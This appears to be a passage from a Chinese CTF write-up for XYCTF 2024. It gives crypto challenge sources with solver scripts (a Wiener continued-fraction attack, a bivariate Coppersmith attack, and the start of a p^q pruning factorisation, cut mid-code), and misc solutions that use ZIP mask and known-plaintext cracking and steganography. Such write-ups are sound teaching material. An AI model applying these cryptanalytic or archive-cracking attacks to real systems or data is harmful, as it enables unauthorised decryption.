class="hljs-attribute">continue</span><br><br>        <span class="hljs-attribute">p</span> = x ** <span class="hljs-number">3</span> + <span class="hljs-number">3</span> * y ** <span class="hljs-number">3</span><br>        <span class="hljs-attribute">if</span> p.bit_length() == <span class="hljs-number">768</span> and p % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> and isPrime(p):<br>            <span class="hljs-attribute">return</span> p<br><br><span class="hljs-attribute">p</span>, q = gainPrime(), gainPrime()<br><span class="hljs-attribute">N</span> = p * q<br><span class="hljs-attribute">phi</span> = (p ** <span class="hljs-number">2</span> + p + <span class="hljs-number">1</span>) * (q ** <span class="hljs-number">2</span> + q + <span class="hljs-number">1</span>)<br><span class="hljs-attribute">d</span> = getPrime(<span class="hljs-number">320</span>)<br><span class="hljs-attribute">e</span> = inverse(d, phi)<br><span class="hljs-attribute">c</span> = d**<span class="hljs-number">2</span>^m<br><br><span class="hljs-attribute">print</span>(f<span class="hljs-string">"N: {N}"</span>)<br><span class="hljs-attribute">print</span>(f<span class="hljs-string">"e: {e}"</span>)<br><span class="hljs-attribute">print</span>(f<span class="hljs-string">"c: {c}"</span>)<br><br><span class="hljs-attribute">N</span>: <span class="hljs-number">913125842482770239379848062277162627509794409924607555622246822717218133091223291889541294440266178282194506242444509803611492259403578922020590849630191477864719052980160940803309686069818208833547621252544423652489179493083138385424424384165228024273745733240109761707533778691158938848158094054261174692601673435971526522219273943464877956131040249169850420336023942653021547841666224446678539579529590840999008107782784268926145671962239929431694391039559247</span><br><span class="hljs-attribute">e</span>: <span class="hljs-number">494518390582436635999115147756676313570637682518235195828939117782099618734167908630788943568232122157772909140885391963441876427590731524706959546524212914108888799081844320513851526790475333924396837458796755678072486028072639014677580265244176441153444956871730684233063789931539669072735599696830757690822185323538738397827461580678488181113667710378657058297572328491762536595872579603698945272140918157163640403488075948987156585480146162739943419183496337465468187233821931312507662218106713861638334075899266373256620752680354704533272722692596941861606161634082613228896420520465402725359166156632884432690715903666803067996854084671477445131853993177110154928274312496230096270510089973592664248613332000290545537840595645944390047611474888693558676781309912289044962293014118087259307560444929227407113819165713213046898243995956550944640168932947118400215917515277554126694376415569909534496134700668701465649939</span><br><span class="hljs-attribute">c</span>: <span class="hljs-number">4450931337369461482106945992542133557585962894030505065110870389112565329875502952762182372926117037373210509516570958483606566274369840551132381128665744266165792377925899683228751870742727716</span><br></code></pre></td></tr></table></figure><p>对e和<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.345ex" height="1.912ex" role="img" focusable="false" viewbox="0 -833.9 1036.6 844.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mn" transform="translate(633,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g></g></g></svg></mjx-container>wiener攻击</p><h4 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">n= <span class="hljs-number">913125842482770239379848062277162627509794409924607555622246822717218133091223291889541294440266178282194506242444509803611492259403578922020590849630191477864719052980160940803309686069818208833547621252544423652489179493083138385424424384165228024273745733240109761707533778691158938848158094054261174692601673435971526522219273943464877956131040249169850420336023942653021547841666224446678539579529590840999008107782784268926145671962239929431694391039559247</span><br>e= <span class="hljs-number">494518390582436635999115147756676313570637682518235195828939117782099618734167908630788943568232122157772909140885391963441876427590731524706959546524212914108888799081844320513851526790475333924396837458796755678072486028072639014677580265244176441153444956871730684233063789931539669072735599696830757690822185323538738397827461580678488181113667710378657058297572328491762536595872579603698945272140918157163640403488075948987156585480146162739943419183496337465468187233821931312507662218106713861638334075899266373256620752680354704533272722692596941861606161634082613228896420520465402725359166156632884432690715903666803067996854084671477445131853993177110154928274312496230096270510089973592664248613332000290545537840595645944390047611474888693558676781309912289044962293014118087259307560444929227407113819165713213046898243995956550944640168932947118400215917515277554126694376415569909534496134700668701465649939</span><br>c= <span class="hljs-number">4450931337369461482106945992542133557585962894030505065110870389112565329875502952762182372926117037373210509516570958483606566274369840551132381128665744266165792377925899683228751870742727716</span><br>n=n**<span class="hljs-number">2</span><br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ContinuedFraction</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,numerator,denumerator</span>):<br>        self.numberlist = [] <span class="hljs-comment"># number in continued fraction</span><br>        self.fractionlist = [] <span class="hljs-comment"># the near fraction list</span><br>        self.GenerateNumberList (numerator, denumerator)<br>        self.GenerateFractionList ()<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateNumberList</span> (self, numerator, denumerator):<br>        <span class="hljs-keyword">while</span> numerator != <span class="hljs-number">1</span>:<br>            quotient = numerator // denumerator<br>            remainder = numerator % denumerator<br>            self.numberlist.append (quotient)<br>            numerator = denumerator<br>            denumerator = remainder<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateFractionList</span> (self) :<br>        self.fractionlist.append ([self.numberlist[<span class="hljs-number">0</span>], <span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span> (self.numberlist)):<br>            numerator = self.numberlist[i]<br>            denumerator = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (i) :<br>                temp = numerator<br>                numerator = denumerator + numerator * self.numberlist[i-j-<span class="hljs-number">1</span>]<br>                denumerator = temp<br>            self.fractionlist.append([numerator, denumerator])<br>a = ContinuedFraction(e,n)<br><span class="hljs-keyword">for</span> k,d <span class="hljs-keyword">in</span> a.fractionlist:<br>    s = long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, n))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(long_to_bytes(d ** <span class="hljs-number">2</span> ^ c).decode())<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-comment">#XYCTF{I_love_to_read_the_crypto_paper_and_try_to_ak_them}</span><br></code></pre></td></tr></table></figure><h3 id="反方向的密码-情难"><a href="#反方向的密码-情难" class="headerlink" title="反方向的密码 情难"></a>反方向的密码 情难</h3><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hash</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> hashlib.sha512(x.encode()).digest() * <span class="hljs-number">2</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">message</span>):<br>    <span class="hljs-keyword">return</span> (message[: <span class="hljs-built_in">len</span>(message) // <span class="hljs-number">2</span>] + <span class="hljs-built_in">hash</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(message))) + message[<span class="hljs-built_in">len</span>(message) // <span class="hljs-number">2</span> :])<br><br><br>p = getStrongPrime(<span class="hljs-number">1024</span>)<br>q = getStrongPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>e = <span class="hljs-number">2</span><br>m = bytes_to_long(pad(flag))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(m, e, n))<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-comment"># 3335299537518434350008670067273514020883265809787658909900831303201069228111667477512288715627313377374377192065531931991830331266940281529429758933125645068623703704431432931062515459304407129764836169638068667723468109909932687335727824459807903558617156661138991973933280805156893120951135488168923425258119689993859896540097318197048436676318334502053269738046279338047497258783747007084564814994803144049365117574904704816542523015746396519693505167963245600047742456478545640334467678554748227823020862550712083249012329745708139070338928730226897923885785783461594034339595106377701306570280371612953393097739</span><br><span class="hljs-comment"># 26278624299187148406559772770865336226934633734285979741424867540828670397865189685966828527168795621543490979182417570078991930822041468539855006585233692884235331084907340302530060261742100702658312435180527335101284800616106884692498603300926488358017928867672861988448488439356448543527810620591324774111321619391264173779312033252573140028630441135269056099074531502841259940379636699304810677716177080486265721322966814104627525953974143476452058638927511594884002185219080847495835727300670028011001853179659250270200020884333850083063514830095064730932997593930711871108436386821290545084229347398808220810263</span><br><br></code></pre></td></tr></table></figure><p>与反方向的密码相思不同是，这里的sha256换成了sha512,放在了flag中间，采用二元coppersmith</p><h4 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c</span>=<span class="hljs-number">3335299537518434350008670067273514020883265809787658909900831303201069228111667477512288715627313377374377192065531931991830331266940281529429758933125645068623703704431432931062515459304407129764836169638068667723468109909932687335727824459807903558617156661138991973933280805156893120951135488168923425258119689993859896540097318197048436676318334502053269738046279338047497258783747007084564814994803144049365117574904704816542523015746396519693505167963245600047742456478545640334467678554748227823020862550712083249012329745708139070338928730226897923885785783461594034339595106377701306570280371612953393097739</span><br><span class="hljs-attribute">n</span>=<span class="hljs-number">26278624299187148406559772770865336226934633734285979741424867540828670397865189685966828527168795621543490979182417570078991930822041468539855006585233692884235331084907340302530060261742100702658312435180527335101284800616106884692498603300926488358017928867672861988448488439356448543527810620591324774111321619391264173779312033252573140028630441135269056099074531502841259940379636699304810677716177080486265721322966814104627525953974143476452058638927511594884002185219080847495835727300670028011001853179659250270200020884333850083063514830095064730932997593930711871108436386821290545084229347398808220810263</span><br><br><span class="hljs-attribute">e</span> = <span class="hljs-number">2</span><br><span class="hljs-attribute">import</span> itertools<br><br><span class="hljs-attribute">def</span> small_roots(f, bounds, m=<span class="hljs-number">1</span>, d=None):<br>    <span class="hljs-attribute">if</span> not d:<br>        <span class="hljs-attribute">d</span> = f.degree()<br>    <span class="hljs-attribute">R</span> = f.base_ring()<br>    <span class="hljs-attribute">N</span> = R.cardinality()<br>    <span class="hljs-attribute">f</span> /= f.coefficients().pop(<span class="hljs-number">0</span>)<br>    <span class="hljs-attribute">f</span> = f.change_ring(ZZ)<br>    <span class="hljs-attribute">G</span> = Sequence([], f.parent())<br>    <span class="hljs-attribute">for</span> i in range(m+<span class="hljs-number">1</span>):<br>        <span class="hljs-attribute">base</span> = N^(m-i) * f^i<br>        <span class="hljs-attribute">for</span> shifts in itertools.product(range(d), repeat=f.nvariables()):<br>            <span class="hljs-attribute">g</span> = base * prod(map(power, f.variables(), shifts))<br>            <span class="hljs-attribute">G</span>.append(g)<br>    <span class="hljs-attribute">B</span>, monomials = G.coefficient_matrix()<br>    <span class="hljs-attribute">monomials</span> = vector(monomials)<br>    <span class="hljs-attribute">factors</span> =<span class="hljs-meta"> [monomial(*bounds) for monomial in monomials]</span><br>    <span class="hljs-attribute">for</span> i, factor in enumerate(factors):<br>        <span class="hljs-attribute">B</span>.rescale_col(i, factor)<br>    <span class="hljs-attribute">B</span> = B.dense_matrix().LLL()<br>    <span class="hljs-attribute">B</span> = B.change_ring(QQ)<br>    <span class="hljs-attribute">for</span> i, factor in enumerate(factors):<br>        <span class="hljs-attribute">B</span>.rescale_col(i, <span class="hljs-number">1</span>/factor)<br>    <span class="hljs-attribute">H</span> = Sequence([], f.parent().change_ring(QQ))<br>    <span class="hljs-attribute">for</span> h in filter(None, B*monomials):<br>        <span class="hljs-attribute">H</span>.append(h)<br>        <span class="hljs-attribute">I</span> = H.ideal()<br>        <span class="hljs-attribute">if</span> I.dimension() == -<span class="hljs-number">1</span>:<br>            <span class="hljs-attribute">H</span>.pop()<br>        <span class="hljs-attribute">elif</span> I.dimension() == <span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">roots</span> =<span class="hljs-meta"> []</span><br>            <span class="hljs-attribute">for</span> root in I.variety(ring=ZZ):<br>                <span class="hljs-attribute">root</span> = tuple(R(root[var]) for var in f.variables())<br>                <span class="hljs-attribute">roots</span>.append(root)<br>            <span class="hljs-attribute">return</span> roots<br>    <span class="hljs-attribute">return</span><span class="hljs-meta"> []</span><br><br><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">import</span> hashlib<br><span class="hljs-attribute">from</span> gmpy2 import *<br><span class="hljs-attribute">m0</span>=bytes_to_long(b'XYCTF{')<br><span class="hljs-attribute">m3</span>=bytes_to_long(b'}')<br><span class="hljs-attribute">def</span> hash(x):<br>    <span class="hljs-attribute">return</span> hashlib.sha512(x.encode()).digest() * <span class="hljs-number">2</span><br><br><span class="hljs-attribute">num</span>=<span class="hljs-number">1024</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">80</span>,<span class="hljs-number">20</span>,-<span class="hljs-number">1</span>):<br>    <span class="hljs-attribute">R</span>.&lt;x,y&gt; = PolynomialRing(Zmod(n))<br>    <span class="hljs-attribute">m2</span>=bytes_to_long(hash(str(i)))<br>    <span class="hljs-attribute">N</span>=(((m0*<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i//<span class="hljs-number">2</span>-<span class="hljs-number">6</span>))+x)*<span class="hljs-number">2</span>^num+m2)*<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i-i//<span class="hljs-number">2</span>))+y*<span class="hljs-number">2</span>^<span class="hljs-number">8</span>+m3)^e-c<br>    <span class="hljs-attribute">m1</span>=small_roots(N, (<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i//<span class="hljs-number">2</span>-<span class="hljs-number">6</span>)), <span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i-i//<span class="hljs-number">2</span>-<span class="hljs-number">1</span>))), m=<span class="hljs-number">4</span>,d=<span class="hljs-number">4</span>)<br>    <span class="hljs-comment">#m=N.small_roots(x=2^(8*(i//2-6)),y=2^(8*(i-i//2)), beta=1, epsilon=0.05)</span><br>    <span class="hljs-attribute">print</span>(i,end=' ')<br>    <span class="hljs-attribute">if</span> m1:<br>        <span class="hljs-attribute">print</span>()<br>        <span class="hljs-attribute">print</span>(m1)<br>        <span class="hljs-attribute">x</span>,y=m1[<span class="hljs-number">0</span>]<br>        <span class="hljs-attribute">print</span>(b'XYCTF{'+long_to_bytes(x)+long_to_bytes(y)+b'}')<br><span class="hljs-comment">#len(flag)=72</span><br><span class="hljs-comment">#b'XYCTF{jun_mai_quan_xia_ni_xiao_gu___wo_ji_ren_jian_xue_man_tou____114514}'    </span><br></code></pre></td></tr></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>扫描二维码关注公众号，发送“XYCTF2024，启动启动启动！！！”获取flag</p><h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p>百度识图</p><img src="/2024/04/29/XYCTF2024WP/image-20240401224835774.png" class title="image-20240401224835774"><p>查看第一张相似图片，游戏名为Papers Please，故flag:XYCTF{Papers Please}</p><h3 id="熊博士"><a href="#熊博士" class="headerlink" title="熊博士"></a>熊博士</h3><p>压缩包得到一张图片和密文，猜测可能是维吉尼亚或者凯斯密码，随波逐流一键解码</p><img src="/2024/04/29/XYCTF2024WP/image-20240401225144467.png" class title="image-20240401225144467"><p>得到flag:XYCTF{liu_ye_mei_you_xiao_jj}</p><h3 id="ez-隐写"><a href="#ez-隐写" class="headerlink" title="ez_隐写"></a>ez_隐写</h3><img src="/2024/04/29/XYCTF2024WP/image-20240406233327363.png" class title="image-20240406233327363"><p>修改hint.png宽高得到hint，猜测压缩包密码是20240401，得到WATERMARK.jpg，图片水印得到</p><img src="/2024/04/29/XYCTF2024WP/image-20240406233833698.png" class title="image-20240406233833698"><h3 id="ZIP神之套"><a href="#ZIP神之套" class="headerlink" title="ZIP神之套"></a>ZIP神之套</h3><p>压缩包打开得到一个exe文件和带密码的压缩包，压缩包密码应该与exe文件有关，运行exe发现闪退，在其所在目录下运行。得到<img src="/2024/04/29/XYCTF2024WP/image-20240406204046688.png" class title="image-20240406204046688"></p><p>故考虑掩码攻击，这里我是之间猜的，应为未知位为8位，misc赛题里好几个地方都用到了比赛开始时间20240401，刚好也为8位，我猜是这个，<img src="/2024/04/29/XYCTF2024WP/image-20240406205133185.png" class title="image-20240406205133185"></p><p>刚好猜对了，掩码攻击也行，得到两个压缩包，发现套.zip里有flag.zip里的文件，刚好可以选择明文攻击</p><img src="/2024/04/29/XYCTF2024WP/image-20240406204350324.png" class title="image-20240406204350324"><img src="/2024/04/29/XYCTF2024WP/image-20240406204445831.png" class title="image-20240406204445831"><p>得到密钥，解压得到flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">XYCTF</span>{<span class="hljs-number">1</span>A4B8-C9D2F3E-<span class="hljs-number">6</span>A4B8C-<span class="hljs-number">9</span>D2F3E7F}<br></code></pre></td></tr></table></figure><h3 id="zzl的护理小课堂"><a href="#zzl的护理小课堂" class="headerlink" title="zzl的护理小课堂"></a>zzl的护理小课堂</h3><p>抓包改url向flag.php发送信息</p><img src="/2024/04/29/XYCTF2024WP/image-20240406234134890.png" class title="image-20240406234134890"><h3 id="TCPL"><a href="#TCPL" class="headerlink" title="TCPL"></a>TCPL</h3><p>直接在Ubuntu运行，提示：riscv64-binfmt-P: Could not open ‘/lib/ld-linux-riscv64-lp64d.so.1’: No such file or directory</p><p>百度搜索，<a href="https://blog.csdn.net/bebebug/article/details/127829361">找到文章</a>，执行代码</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><br>sudo apt <span class="hljs-keyword">install</span> libc6-riscv64-cross<br>sudo apt <span class="hljs-keyword">install</span> binutils-riscv64-linux-gnu<br>sudo apt <span class="hljs-keyword">install</span> gcc-riscv64-linux-gnu<br>sudo apt <span class="hljs-keyword">install</span> binutils-riscv64-unknown-elf<br>sudo apt <span class="hljs-keyword">install</span> gcc-riscv64-unknown-elf<br>sudo apt <span class="hljs-keyword">install</span> qemu-system-misc<br>sudo apt <span class="hljs-keyword">install</span> qemu-user<br><br>sudo cp /usr/riscv64-linux-gnu/lib/* /lib/<br><br></code></pre></td></tr></table></figure><p>运行附件得到</p><img src="/2024/04/29/XYCTF2024WP/image-20240407124249519.png" class title="image-20240407124249519"><p>将1换成0，即可得flag</p><img src="/2024/04/29/XYCTF2024WP/image-20240415202639649.png" class title="image-20240415202639649"><h3 id="九转修仙转（未完成）"><a href="#九转修仙转（未完成）" class="headerlink" title="九转修仙转（未完成）"></a>九转修仙转（未完成）</h3><p>压缩包最外层密码：XYCTF20240401</p><h4 id="炼气-天书解密"><a href="#炼气-天书解密" class="headerlink" title="炼气:天书解密"></a>炼气:天书解密</h4><img src="/2024/04/29/XYCTF2024WP/image-20240407203224965.png" class title="image-20240407203224965"><p>爆破图片宽高得到</p><img src="/2024/04/29/XYCTF2024WP/image-20240407203514580.png" class title="image-20240407203514580"><h4 id="筑基"><a href="#筑基" class="headerlink" title="筑基"></a>筑基</h4><p>随波逐流一键解密，<strong>BubbleBabble</strong>编码</p><img src="/2024/04/29/XYCTF2024WP/image-20240516182259641.png" class title="image-20240516182259641"><p>LSB隐写得到</p><img src="/2024/04/29/XYCTF2024WP/image-20240516182801225.png" class title="image-20240516182801225"><p>base64解码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">0f_crypt0_and_<br></code></pre></td></tr></table></figure><h4 id="结丹"><a href="#结丹" class="headerlink" title="结丹"></a>结丹</h4><p>摩斯密码（四个交点为”-”，三个交点为空格，一个交点为”.”）</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">- <span class="hljs-string">....</span> . <span class="hljs-string">..--.-</span> - <span class="hljs-string">....</span> <span class="hljs-string">..</span> <span class="hljs-string">.-.</span> -<span class="hljs-string">..</span><br></code></pre></td></tr></table></figure><p>打开flag.zip提示有额外数据，010查看</p><img src="/2024/04/29/XYCTF2024WP/image-20240516183319807.png" class title="image-20240516183319807"><p>解码得到</p><img src="/2024/04/29/XYCTF2024WP/image-20240516183531174.png" class title="image-20240516183531174"><h4 id="第四层：元婴"><a href="#第四层：元婴" class="headerlink" title="第四层：元婴"></a>第四层：元婴</h4><img src="/2024/04/29/XYCTF2024WP/image-20240407220852148.png" class title="image-20240407220852148"><h4 id="第5层：化神"><a href="#第5层：化神" class="headerlink" title="第5层：化神"></a>第5层：化神</h4><p>md5爆破得到压缩包密码：key{liuyyds}</p><h4 id="炼虚"><a href="#炼虚" class="headerlink" title="炼虚"></a>炼虚</h4><h4 id="合体"><a href="#合体" class="headerlink" title="合体"></a>合体</h4><h4 id="第8层：大乘-p-q-剪枝算法"><a href="#第8层：大乘-p-q-剪枝算法" class="headerlink" title="第8层：大乘   p^q  剪枝算法"></a>第8层：大乘   p^q  剪枝算法</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs 1c">n= <span class="hljs-number">22424440693845876425615937206198156323192795003070970628372481545586519202571910046980039629473774728476050491743579624370862986329470409383215065075468386728605063051384392059021805296376762048386684738577913496611584935475550170449080780985441748228151762285167935803792462411864086270975057853459586240221348062704390114311522517740143545536818552136953678289681001385078524272694492488102171313792451138757064749512439313085491407348218882642272660890999334401392575446781843989380319126813905093532399127420355004498205266928383926087604741654126388033455359539622294050073378816939934733818043482668348065680837</span><br>c= <span class="hljs-number">1400352566791488780854702404852039753325619504473339742914805493533574607301173055448281490457563376553281260278100479121782031070315232001332230779334468566201536035181472803067591454149095220119515161298278124497692743905005479573688449824603383089039072209462765482969641079166139699160100136497464058040846052349544891194379290091798130028083276644655547583102199460785652743545251337786190066747533476942276409135056971294148569617631848420232571946187374514662386697268226357583074917784091311138900598559834589862248068547368710833454912188762107418000225680256109921244000920682515199518256094121217521229357</span><br>gift= <span class="hljs-number">14488395911544314494659792279988617621083872597458677678553917360723653686158125387612368501147137292689124338045780574752580504090309537035378931155582239359121394194060934595413606438219407712650089234943575201545638736710994468670843068909623985863559465903999731253771522724352015712347585155359405585892</span><br>from Crypto.Util.number import*<br>from gmpy2 import*<br>import math<br><br><br>def check_cong(k, p, q, n, xored=None):<br>    kmask = (<span class="hljs-number">1</span> &lt;&lt; k) - <span class="hljs-number">1</span><br>    p <span class="hljs-meta">&amp;= kmask</span><br>    q <span class="hljs-meta">&amp;= kmask</span><br>    n <span class="hljs-meta">&amp;= kmask</span><br>    pqm = (p*q) <span class="hljs-meta">&amp; kmask</span><br>    return pqm == n and (xored is None or (p^q) == (xored <span class="hljs-meta">&amp; kmask))</span><br><br>def extend(k, a):<br>    kbit = <span class="hljs-number">1</span> &lt;&lt; (k-<span class="hljs-number">1</span>)<br>    assert a &lt; kbit<br>    yield a<br>    yield a <span class="hljs-string">| kbit</span><br><br>def factor(n, p_xor_q):<br>    tracked = set([(p, q) for p in [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>] for q in [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]<br>                   if check_cong(<span class="hljs-number">1</span>, p, q, n, p_xor_q)])<br><br>    PRIME_BITS = int(math.ceil(math.<span class="hljs-built_in">log</span>(n, <span class="hljs-number">2</span>)/<span class="hljs-number">2</span>))<br><br>    maxtracked = len(tracked)<br>    for k in range(<span class="hljs-number">2</span>, PRIME_BITS+<span class="hljs-number">1</span>):<br>        newset = set()<br>        for tp, tq in tracked:<br>            for newp_ in extend(k, tp):<br>                for newq_ in extend(k, tq):<br>                    <span class="hljs-meta"># Remove symmetry</span><br>                    newp, 